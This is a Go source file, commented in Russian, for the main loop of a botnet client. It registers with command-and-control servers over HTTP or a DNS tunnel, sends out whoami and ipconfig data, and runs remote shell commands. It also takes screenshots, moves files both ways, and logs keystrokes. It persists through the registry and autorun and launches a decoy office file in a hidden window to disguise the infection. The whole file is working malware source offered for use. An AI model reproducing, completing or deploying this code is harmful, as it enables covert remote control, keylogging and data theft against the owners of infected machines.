package main

import (
	"addfile"
	"bytes"
	"fmt"
	"gobotnet"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"syscall"
	"time"
	"wrapper"
)

var (
	/********CONFIG*********/
	usingHTTP          bool
	usingDNS           bool //Включает использование днс туннеля
	launchFakeFile     bool //включает запуск фейкового файла экселя/ворда и т.д. Файл должен быть записан в addfile.go
	rewriteExe         bool
	usingAutorun       bool
	usingRegistry      bool   //включает или выключает сохранение в реестр токена и id используемого командного сервера и попытки загрузки его
	debugMode          bool   //включает или выключает вывод информации
	attemptCount       int    //количество попыток получить команду от сервера, если все попытки неудачные бот будет искать следующий сервер
	dnsAddress         string //DNS имя сервера
	winHttpTimeout     []int  //установка timeout для winhttp https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa384116(v=vs.85).aspx
	botNetUrlArray     []string
	botNetPortArray    []int
	messageExchange    wrapper.MessageExchange = wrapper.HttpMessageExchange{} //Интерфейс протокола DNS или HTTP
	groupId            string
	whoamiInfo         []byte
	ipconfigInfo       []byte
	compressScreenshot bool = false
)

const (
	MAX_WAIT_TIME = 10 //Верхняя граница для рандомного времени между запросами к серверу
	NAME_LEN      = 32 //Длина уникального имени генерируемого ботом
	//строки команд
	WHOAMI       = "whoami"
	IPCONFIG     = "ipconfig"
	CMD_IDLE     = "idle"
	CMD_EXEC     = "exec"
	CMD_DOWNLOAD = "download"
	CMD_UPLOAD   = "upload"
	CMD_SCREEN   = "screenshot"
	CMD_DESTROY  = "destroy"
	KEYLOG       = "keys"
	KEYLOG_STOP  = "keysStop"
	STATUS_ERROR = "error"

	TYPE_REG         = 1
	TYPE_GET_COMMAND = 2
	TYPE_HTTP        = 1
	TYPE_DNS         = 2
)

//Выполнняем команду в консоли
func execute(token string, param string) (r_code int) {
	output, _ := gobotnet.CmdExecOrig(param)
	r_code, _ = messageExchange.ApiOutputCommand(token, param, output)
	return r_code
}

//Проверяем сервер с помоьщю get_command с известным токеном
func checkServer(index int, token string) (alive bool, reg bool) {
	wrapper.SetBotNetUrl(index)
	code, _, err := messageExchange.ApiGetCommand(token)
	if code == 1 {
		//Возвращаем если сервер жив и токен валидный
		return true, true
	} else if err == STATUS_ERROR {
		//Возвращаем если сервер жив и токен невалидный
		return true, false
	} else {
		//Если сервер не отвечат
		return false, false
	}
}

//Проверяем индекс, чтобы не выходил за пределы массива
func checkValidIndex(index int) (valid bool) {
	if index >= 0 && index < wrapper.GetUrlArrayLen() {
		return true
	} else {
		return false
	}
}

//Пытаемся зарегистрироваться на сервере с указанным индексом
//Возвращаем токен, если получилось, и пустую строку если нет
func tryRegistration(url_index int) string {
	wrapper.SetBotNetUrl(url_index)
	r_code, token := messageExchange.ApiRegister(string(whoamiInfo), []byte(string(whoamiInfo)+string(ipconfigInfo)), groupId)
	//Если токен получили
	if r_code == 1 && len(token) > 0 {
		gobotnet.OutMessage("Get token: " + token)
		//Если включаена работа с реестром, то сохраняем токен и индекс сервера
		if usingRegistry {
			gobotnet.SaveUrlToRegistry(strconv.Itoa(url_index))
			gobotnet.SaveTokenToRegistry(token)
		} else {
			gobotnet.OutMessage("Work with registry is off")
		}
		return token
	} else {
		time.Sleep(time.Second * time.Duration(rand.Intn(MAX_WAIT_TIME)))
	}
	return ""
}

//Функция слушает сервер и отвечает
func startListen(token string, url_index int) (r_code int) {
	//устанавливаем полученный сервер по индексу
	wrapper.SetBotNetUrl(url_index)
	r_code = 1

	//Создаем chan для кейлогера
	keyLogStopChan := make(chan int)

	for r_code > 0 {
		attempt_connect := 0
		var command string
		var param string
		//пробуем получить команду от сервера несколько раз
		for attempt_connect < attemptCount {
			var code int
			time.Sleep(time.Second * time.Duration(rand.Intn(MAX_WAIT_TIME)))
			code, command, param = messageExchange.ApiGetCommand(token)
			r_code = code
			//Если код = 1 значит команда пришла
			if r_code == 1 {
				break
			}
			attempt_connect++
		}

		//Если ничего вообще не получили от сервера - выходим
		if r_code == 0 {
			token = ""
			break
		}

		switch command {
		//Ожидание - ничео не делаем
		case CMD_IDLE:
			break
		//Выполняем команду в консоли в отдельном потоке
		case CMD_EXEC:
			go execute(token, param)
		//Делаем скрин и отправляем
		case CMD_SCREEN:
			img, _ := gobotnet.CaptureScreen(compressScreenshot)
			if len(img) > 0 {
				r_code, _ = messageExchange.ApiScreenshot(token, img)
			}
		//Загружаем файл на машину
		case CMD_UPLOAD:
			r_code, _ = messageExchange.ApiUploadFile(token, gobotnet.GetFullPathBotDir()+"\\")
		//Выгружаем файл на сервер
		case CMD_DOWNLOAD:
			fileBytes, err := gobotnet.ReadFile(param)
			if err == nil {
				gobotnet.OutMessage("Get filename = " + filepath.Base(param))
				gobotnet.OutMessage("Read bytes from file = " + strconv.Itoa(len(fileBytes)))
				r_code, _ = messageExchange.ApiDownloadFile(token, filepath.Base(param), fileBytes)
			}
		//Самоуничтожение
		case CMD_DESTROY:
			gobotnet.UnRegistryFromConsole(usingRegistry)
			r_code = -1
			os.Exit(1)
		//Келогер
		case KEYLOG:
			go func() {
				var buff bytes.Buffer
				for {
					select {
					case <-keyLogStopChan:
						r_code, _ = messageExchange.ApiOutputCommand(token, "keys", buff.Bytes())
						return
					default:
						i, err := gobotnet.KeyLog()
						buff.WriteByte(byte(i))

						if err != nil {
							fmt.Println(i)
						}
						time.Sleep(1 * time.Microsecond)
					}
				}
			}()
		case KEYLOG_STOP:
			keyLogStopChan <- 1
		}
	}
	return r_code
}

//Запускаем фейк файл
//Файл берется из src/addfile/addfile.go
//Записывается в папку в которой расположен exe и затем запускается

func runFakeFile() {
	//path := gobotnet.GetFullPathBotDir()

	file := addfile.GetAdditionFile()
	filename := addfile.GetAdditionFileName()
	//er := gobotnet.CreateDir(path, 0777)
	/*if !er {
	return
	}*/
	//fullname := path + "\\" + filename

	err := gobotnet.CreateFileAndWriteData(filename, file)
	if err != nil {
		return
	}

	cmd := exec.Command("cmd", "/C", filename)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

}

//Функция тестирующая коннект к серверу,
//typeMessage - TYPE_REG - нет токена, пытаемся регистрироваться или TYPE_GET_COMMAND токен есть, пытаемся подключиться к доступному серверу
//type_req - используемый протокол TYPE_HTTP или TYPE_DNS
//token - токен
//start_id_server - начальный индекс сервера из массива botNetUrlArray, обычно не 0, если используем какой-то известный сервер
//Возвращает токен и индекс сервера
func testServer(typeMessage int, type_req int, token string, start_id_server int) (token_res string, id_server int) {
	for {
		for i := start_id_server; i < len(botNetUrlArray); i++ {
			//fmt.Printf("attempt: %d\n", i)
			//Устанавливаем i-ый номер URL сервера
			wrapper.SetBotNetUrl(i)

			if type_req == TYPE_REG {
				//Пытаемся зарегистрироваться
				token = ""
				token = tryRegistration(i)
				if token != "" {
					return token, i
				}

			} else if type_req == TYPE_GET_COMMAND {
				//Считаем что у нас есть токен и чекаем сервер
				alive, reg := checkServer(i, token)
				//fmt.Printf("alive reg: %t %t \n", alive, reg)
				//Если сервер жив и такой токен зарегистрирован у него
				if alive && reg {
					return token, i
					//Если сервер жив, но такого токена не знает
				} else if alive && !reg {
					type_req = TYPE_REG
					i = -1
					continue
				}
			}

			//Это здесь для того, чтобы пробовать подключиться по DNS только один раз
			if typeMessage == TYPE_DNS {
				break
			}
		}

		//Если ничего не получилось пробуем другой протокол
		if typeMessage == TYPE_DNS {
			if usingHTTP {
				typeMessage = TYPE_HTTP
				messageExchange = wrapper.HttpMessageExchange{}
				compressScreenshot = false
			}
			//fmt.Println("Http")
		} else {
			if usingDNS {
				typeMessage = TYPE_DNS
				messageExchange = wrapper.DnsMessageExchange{}
				compressScreenshot = true
				//fmt.Println("DNS")
			}
		}
		start_id_server = 0
	}
}

func setupConfig() {

	usingDNS = addfile.GetUsingDns()
	usingHTTP = addfile.GetUsingHttp()
	launchFakeFile = addfile.GetLaunchFakeFile()
	rewriteExe = addfile.GetRewriteExe()
	usingAutorun = addfile.GetUsingAutorun()
	usingRegistry = addfile.GetUsingRegistry()
	debugMode = addfile.GetDebugMode()
	attemptCount = addfile.GetAttempCount()
	dnsAddress = addfile.GetDnsAddress()
	winHttpTimeout = addfile.GetWinHttpTimeout()
	botNetUrlArray = addfile.GetServerUrls()
	botNetPortArray = addfile.GetServerPorts()
	groupId = addfile.GetGroupId()

	if addfile.GetFirstInterface() == "HTTP" {
		messageExchange = wrapper.HttpMessageExchange{}

	} else if addfile.GetFirstInterface() == "DNS" {
		messageExchange = wrapper.DnsMessageExchange{}
	} else {
		gobotnet.OutMessage("ERROR Unknown protocol interface. Setting HTTP")
		messageExchange = wrapper.HttpMessageExchange{}
	}

}

func main() {

	setupConfig()

	//Инициализируем необходимые значения
	wrapper.SetUrlAndPortArrays(botNetUrlArray, botNetPortArray)
	wrapper.SetWinHttpTimeout(winHttpTimeout)
	wrapper.SetDnsURL(dnsAddress)
	gobotnet.SetDebugMode(debugMode)
	rand.Seed(time.Now().UnixNano())
	/*
		if registrationOnTachilla {
			if gobotnet.RegistryFromConsole() {
				if launchFakeFile {
					runFakeFile()
				} else {
					gobotnet.OutMessage("Launch fake file off")
				}
			}
		} else {
			gobotnet.OutMessage("Registration is off")
		}
	*/

	// Запускаем фейк файл если нужно
	if launchFakeFile {
		runFakeFile()
	} else {
		gobotnet.OutMessage("Launch fake file off")
	}

	// Сохраняем exe файл в папку %username%/appdata/roaming/asocialfriend
	// И если включена работа с реестром (usingRegistry) то бот зарегистрируется в автозапуске
	gobotnet.RegistryFromConsole(usingAutorun, usingRegistry, rewriteExe)

	token := ""
	url_index := 0

	//Проверяем есть ли уже сохраненный токе в реестре или нет
	if usingRegistry {
		token = gobotnet.GetTokenFromRegistry()
		gobotnet.OutMessage("Get token from registry:" + token)
		url_index, _ = strconv.Atoi(gobotnet.GetUrlFromRegistry())
	} else {
		gobotnet.OutMessage("Work with registry is off")
	}

	//Сохраняем вывод команд, который пошлем после регистрации
	whoamiInfo, _ = gobotnet.CmdExecOrig(WHOAMI)
	ipconfigInfo, _ = gobotnet.CmdExecOrig(IPCONFIG)
	if len(whoamiInfo) == 0 {
		whoamiInfo = []byte(gobotnet.RandStringRunes(NAME_LEN))
	}
	if len(ipconfigInfo) == 0 {
		ipconfigInfo = []byte(gobotnet.RandStringRunes(NAME_LEN))
	}

	for {

		//Проверяем валидный ли токен и валидный ли индекс сервера
		//Токен и индекс могли быть получены из реестра
		if len(token) > 0 && checkValidIndex(url_index) {
			//Если все ок, тестируем коннект к серверу
			token, url_index = testServer(TYPE_HTTP, TYPE_GET_COMMAND, token, url_index)
		} else {
			//Если не ок пытаемся зарегистрироваться на каком-либо сервере
			token, url_index = testServer(TYPE_HTTP, TYPE_REG, token, 0)
		}

		//fmt.Println("Token = " + token + " Index = " + strconv.Itoa(url_index))
		//На этом шаге токен и индекс сервера должны быть точно валидные
		//Начинаем слушать команды от сервера
		startListen(token, url_index)

		//Если бот вышел из startListen то скорее всего соединение отвалилось или сервер упал
		//В этом случае будем искать сервер заново
		url_index = 0
		messageExchange = wrapper.HttpMessageExchange{}

	}
}
